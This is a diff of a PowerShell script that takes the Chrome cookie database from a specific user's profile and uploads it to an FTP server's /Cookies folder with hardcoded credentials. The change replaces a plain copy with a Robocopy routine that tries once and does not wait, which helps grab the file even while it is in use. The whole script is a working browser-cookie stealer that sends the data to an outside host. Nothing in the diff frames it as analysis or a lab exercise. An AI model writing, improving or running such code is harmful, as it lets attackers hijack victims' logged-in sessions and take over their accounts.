@@ -4,10 +4,10 @@ $FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
 $FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'
 
 # Directories to work with
-$source_directory_1 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
-$source_directory_2 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
+$source_directory = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
+$target_directory = "C:\temp"
 
-# FTP function to upload files, now directing files to /Cookies directory
+# Function to upload files to the FTP server, directing files to /Cookies directory
 function Upload-ToFtp {
     param (
         [String]$file_path,
@@ -34,20 +34,30 @@ function Upload-ToFtp {
     Write-Host "Uploaded $file_name to FTP in /Cookies."
 }
 
-# Check if the first file exists, then copy and upload
-if (Test-Path $source_directory_1) {
-    $file_name = [System.IO.Path]::GetFileName($source_directory_1)
-    $temp_path = Join-Path -Path "C:\temp" -ChildPath $file_name
-    Copy-Item -Path $source_directory_1 -Destination $temp_path # Copy the file to a temporary location
-    Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
-    Remove-Item -Path $temp_path # Clean up the temporary file
-} else {
-    Write-Host "The directory or file does not exist."
+# Attempt to copy the file using Robocopy
+function Copy-FileWithRobocopy {
+    param (
+        [String]$source_directory,
+        [String]$target_directory,
+        [String]$file_name
+    )
+    $robocopyResult = robocopy $source_directory $target_directory $file_name /R:0 /W:0
+    if ($robocopyResult -match "0 file\(s\) copied") {
+        Write-Host "The file was not copied, it might be in use or does not exist."
+        return $false
+    } else {
+        Write-Host "File copied successfully."
+        return $true
+    }
 }
 
-# Check for the second directory and ignore if it doesn't exist
-if (Test-Path $source_directory_2) {
-    Write-Host "Project2 directory exists." # Placeholder for actual actions
+# Main script to check, copy, and upload the file
+$file_name = [System.IO.Path]::GetFileName($source_directory)
+$temp_path = Join-Path -Path $target_directory -ChildPath $file_name
+
+if (Copy-FileWithRobocopy -source_directory $source_directory -target_directory $target_directory -file_name $file_name) {
+    Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
+    Remove-Item -Path $temp_path -Force # Clean up the temporary file
 } else {
-    Write-Host "Project2 folder does not exist, ignoring."
+    Write-Host "Failed to copy or upload the file."
 }
